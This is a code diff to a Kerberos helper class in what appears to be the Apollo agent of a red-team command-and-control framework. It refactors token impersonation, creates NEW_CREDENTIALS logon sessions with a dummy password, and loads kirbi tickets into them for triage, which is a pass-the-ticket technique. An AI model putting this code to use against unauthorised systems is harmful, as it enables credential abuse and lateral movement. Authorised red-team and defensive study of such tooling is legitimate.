@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -7,6 +7,7 @@ using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text;
 using ApolloInterop.Enums;
+using ApolloInterop.Classes.Impersonation;
 using ApolloInterop.Features.KerberosTickets;
 using ApolloInterop.Features.WindowsTypesAndAPIs;
 using ApolloInterop.Structs.MythicStructs;
@@ -53,9 +54,10 @@ internal class KerberosHelpers
                 if (elevated)
                 {
                     systemHandle = new();
-                    var originalUser =  WindowsIdentity.Impersonate(_systemHandle);
-                    WindowsAPI.LsaConnectUntrustedDelegate(out lsaHandle);
-                    originalUser.Undo();
+                    ImpersonationScope.Run(new WindowsIdentity(_systemHandle), () =>
+                    {
+                        WindowsAPI.LsaConnectUntrustedDelegate(out lsaHandle);
+                    });
                     createdArtifacts.Add(Artifact.WindowsAPIInvoke("LsaConnectUntrusted"));
                 }
                 else
@@ -281,28 +283,47 @@ internal class KerberosHelpers
 
     private static HANDLE CreateNewLogonSession()
     {
+        HANDLE tokenInfo = new();
         try
         {
-            UNICODE_STRING userName = new(WindowsIdentity.GetCurrent().Name);
-            UNICODE_STRING logonDomainName = new(Environment.UserDomainName);
-            UNICODE_STRING password = new("password");
-            HANDLE<UNICODE_STRING> userNameHandle = new(userName);
-            HANDLE<UNICODE_STRING> logonDomainNameHandle = new(logonDomainName);
-            HANDLE<UNICODE_STRING> passwordHandle = new(password);
-            bool didLogon = WindowsAPI.LogonUserADelegate(userNameHandle, logonDomainNameHandle, passwordHandle, Win32.LogonType.LOGON32_LOGON_NEW_CREDENTIALS, Win32.LogonProvider.LOGON32_PROVIDER_WINNT50, out HANDLE token);
-            createdArtifacts.Add(Artifact.WindowsAPIInvoke("LogonUserA"));
-            if (didLogon)
+            string currentIdentity = WindowsIdentity.GetCurrent().Name;
+            string userName = currentIdentity;
+            string logonDomainName = Environment.UserDomainName;
+
+            int domainSeparator = currentIdentity.IndexOf('\\');
+            if (domainSeparator > 0 && domainSeparator < currentIdentity.Length - 1)
             {
-                createdArtifacts.Add(Artifact.PlaintextLogon(userName.ToString()));
+                logonDomainName = currentIdentity.Substring(0, domainSeparator);
+                userName = currentIdentity.Substring(domainSeparator + 1);
             }
-            //debug get the luid for the token
+
+            const string password = "password";
+            bool didLogon = WindowsAPI.LogonUserWDelegate(
+                userName,
+                logonDomainName,
+                password,
+                Win32.LogonType.LOGON32_LOGON_NEW_CREDENTIALS,
+                Win32.LogonProvider.LOGON32_PROVIDER_WINNT50,
+                out HANDLE token);
+            createdArtifacts.Add(Artifact.WindowsAPIInvoke("LogonUserW"));
+            if (!didLogon)
+            {
+                DebugHelp.DebugWriteLine($"Failed to create new logon session: {Marshal.GetLastWin32Error()}");
+                return new();
+            }
+
+            createdArtifacts.Add(Artifact.PlaintextLogon($"{logonDomainName}\\{userName}"));
+
             int tokenInfoSize = Marshal.SizeOf<TOKEN_STATISTICS>();
-            HANDLE tokenInfo = (HANDLE)Marshal.AllocHGlobal(tokenInfoSize);
-            WindowsAPI.GetTokenInformationDelegate(token, Win32.TokenInformationClass.TokenStatistics,tokenInfo, tokenInfoSize, out int returnLength);
-            createdArtifacts.Add(Artifact.WindowsAPIInvoke("GetTokenInformation"));
-            TOKEN_STATISTICS tokenStats = tokenInfo.CastTo<TOKEN_STATISTICS>();
-            DebugHelp.DebugWriteLine($"New Logon Session LUID: {tokenStats.AuthenticationId}");
-            DebugHelp.DebugWriteLine($"Current Logon Session LUID: {GetCurrentLuid()}");
+            tokenInfo = (HANDLE)Marshal.AllocHGlobal(tokenInfoSize);
+            if (WindowsAPI.GetTokenInformationDelegate(token, Win32.TokenInformationClass.TokenStatistics, tokenInfo, tokenInfoSize, out int returnLength))
+            {
+                createdArtifacts.Add(Artifact.WindowsAPIInvoke("GetTokenInformation"));
+                TOKEN_STATISTICS tokenStats = tokenInfo.CastTo<TOKEN_STATISTICS>();
+                DebugHelp.DebugWriteLine($"New Logon Session LUID: {tokenStats.AuthenticationId}");
+                DebugHelp.DebugWriteLine($"Current Logon Session LUID: {GetCurrentLuid()}");
+            }
+
             return token;
         }
         catch (Exception e)
@@ -310,6 +331,13 @@ internal class KerberosHelpers
             Console.WriteLine(e);
             DebugHelp.DebugWriteLine($"{Marshal.GetLastWin32Error()}");
             return new();
+        }
+        finally
+        {
+            if (!tokenInfo.IsNull)
+            {
+                Marshal.FreeHGlobal(tokenInfo.PtrLocation);
+            }
         }
     }
 
@@ -711,41 +739,60 @@ internal class KerberosHelpers
     internal static KerberosTicket? TryGetTicketDetailsFromKirbi(byte[] kirbiTicket)
     {
         KerberosTicket? ticket = null;
+        HANDLE newlogonHandle = new();
+        HANDLE tokenInfo = new();
+
         try
         {
-            HANDLE newlogonHandle = CreateNewLogonSession();
+            newlogonHandle = CreateNewLogonSession();
             if (newlogonHandle.IsNull)
             {
                 DebugHelp.DebugWriteLine("Failed to create new logon session");
                 DebugHelp.DebugWriteLine($"{Marshal.GetLastWin32Error()}");
+                return ticket;
             }
-            else
+
+            ImpersonationScope.Run(new WindowsIdentity((IntPtr)newlogonHandle), () =>
             {
-                WindowsAPI.ImpersonateLoggedOnUserDelegate(newlogonHandle);
-                createdArtifacts.Add(Artifact.WindowsAPIInvoke("ImpersonateLoggedOnUser"));
-                //passing new luid here is fine because we have switched to the new logon session
                 int tokenInfoSize = Marshal.SizeOf<TOKEN_STATISTICS>();
-                HANDLE tokenInfo = (HANDLE)Marshal.AllocHGlobal(tokenInfoSize);
-                WindowsAPI.GetTokenInformationDelegate(newlogonHandle, Win32.TokenInformationClass.TokenStatistics, tokenInfo, tokenInfoSize, out int returnLength);
+                tokenInfo = (HANDLE)Marshal.AllocHGlobal(tokenInfoSize);
+                if (!WindowsAPI.GetTokenInformationDelegate(newlogonHandle, Win32.TokenInformationClass.TokenStatistics, tokenInfo, tokenInfoSize, out int returnLength))
+                {
+                    DebugHelp.DebugWriteLine("Failed to query token information for new logon handle");
+                    return;
+                }
+
                 createdArtifacts.Add(Artifact.WindowsAPIInvoke("GetTokenInformation"));
                 TOKEN_STATISTICS tokenStats = tokenInfo.CastTo<TOKEN_STATISTICS>();
                 LoadTicket(kirbiTicket, tokenStats.AuthenticationId);
-                ticket = TriageTickets(getSystemTickets:true, targetLuid:$"{tokenStats.AuthenticationId}").FirstOrDefault();
-                if(ticket != null)
+                ticket = TriageTickets(getSystemTickets: true, targetLuid: $"{tokenStats.AuthenticationId}").FirstOrDefault();
+                if (ticket != null)
                 {
                     ticket.Kirbi = kirbiTicket;
                     DebugHelp.DebugWriteLine($"Converted base64 ticket to KerberosTicket: {ticket.ToString().ToIndentedString()}");
-                } else
-                {
-                    DebugHelp.DebugWriteLine($"Failed to triage any tickets");
                 }
-            }
+                else
+                {
+                    DebugHelp.DebugWriteLine("Failed to triage any tickets");
+                }
+            });
         }
         catch (Exception e)
         {
             DebugHelp.DebugWriteLine($"Error converting base64 ticket to KerberosTicket: {e.Message} \n stack trace: {e}");
         }
+        finally
+        {
+            if (!tokenInfo.IsNull)
+            {
+                Marshal.FreeHGlobal(tokenInfo.PtrLocation);
+            }
+            if (!newlogonHandle.IsNull)
+            {
+                WindowsAPI.CloseHandleDelegate(newlogonHandle);
+            }
+        }
+
         return ticket;
     }
-    
 }
